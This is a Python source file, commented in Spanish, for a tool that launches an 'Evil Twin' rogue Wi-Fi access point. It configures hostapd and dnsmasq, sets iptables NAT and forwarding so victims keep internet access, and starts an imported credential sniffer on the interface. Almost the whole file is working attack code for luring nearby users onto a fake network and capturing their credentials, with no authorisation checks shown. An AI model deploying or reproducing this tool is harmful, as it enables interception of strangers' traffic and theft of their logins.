import os
import subprocess
import threading
import time
from backend.logger import log_event
from backend.credential_sniffer import credential_sniffer

class RogueAPManager:
    """
    Gestor profesional de Access Point Falso (Evil Twin).
    Requiere hostapd y dnsmasq instalados en el sistema.
    """
    def __init__(self):
        self.active = False
        self.interface = "wlan1" # Por defecto wlan1 (para no matar la conexión principal)
        self.ssid = "FREE_WIFI_NETGUARD"
        self.processes = []
        self.lock = threading.Lock()

    def start(self, ssid, interface):
        with self.lock:
            if self.active:
                return False
            
            self.ssid = ssid
            self.interface = interface
            
            # 1. Preparar interfaz (Monitor Mode y IP)
            try:
                # Matar procesos conflictivos
                subprocess.run(["nmcli", "device", "set", interface, "managed", "no"], check=False)
                subprocess.run(["ip", "link", "set", interface, "down"], check=False)
                subprocess.run(["ip", "addr", "flush", "dev", interface], check=False)
                subprocess.run(["ip", "addr", "add", "10.0.0.1/24", "dev", interface], check=False)
                subprocess.run(["ip", "link", "set", interface, "up"], check=False)
                
                # 2. Configuración de hostapd
                hostapd_conf = f"""
interface={interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel=6
auth_algs=1
wmm_enabled=0
"""
                with open("hostapd.conf", "w") as f:
                    f.write(hostapd_conf.strip())
                
                # 3. Configuración de dnsmasq
                dnsmasq_conf = f"""
interface={interface}
dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
"""
                with open("dnsmasq.conf", "w") as f:
                    f.write(dnsmasq_conf.strip())

                # 4. Iniciar Servicios
                h_proc = subprocess.Popen(["hostapd", "hostapd.conf"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                d_proc = subprocess.Popen(["dnsmasq", "-C", "dnsmasq.conf", "-d"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                self.processes = [h_proc, d_proc]
                self.active = True
                
                # 5. IP Forwarding e IPTables para salida a internet (Opcional, pero recomendado para "Evil Twin")
                os.system("sysctl -w net.ipv4.ip_forward=1 > /dev/null")
                os.system(f"iptables -t nat -A POSTROUTING -o eno1 -j MASQUERADE") # Cambiar eno1 si es necesario
                os.system(f"iptables -A FORWARD -i {interface} -j ACCEPT")
                
                # 6. Iniciar Sniffer de Credenciales
                credential_sniffer.start(interface)
                
                log_event("WARNING", f"📡 EVIL TWIN ACTIVADO: SSID '{ssid}' en interfaz '{interface}'")
                return True
                
            except Exception as e:
                print(f"Error iniciando Rogue AP: {e}")
                self.stop()
                return False

    def stop(self):
        with self.lock:
            for p in self.processes:
                try: p.terminate()
                except: pass
            
            self.processes = []
            self.active = False
            
            # Detener Sniffer
            credential_sniffer.stop()
            
            # Limpiar IPTables y restaurar interfaz
            os.system(f"iptables -t nat -D POSTROUTING -o eno1 -j MASQUERADE > /dev/null 2>&1")
            subprocess.run(["nmcli", "device", "set", self.interface, "managed", "yes"], check=False)
            
            log_event("INFO", "📡 Evil Twin desactivado.")

    def get_status(self):
        return {
            "active": self.active,
            "ssid": self.ssid,
            "interface": self.interface,
            "gateway": "10.0.0.1"
        }

rogue_ap_manager = RogueAPManager()
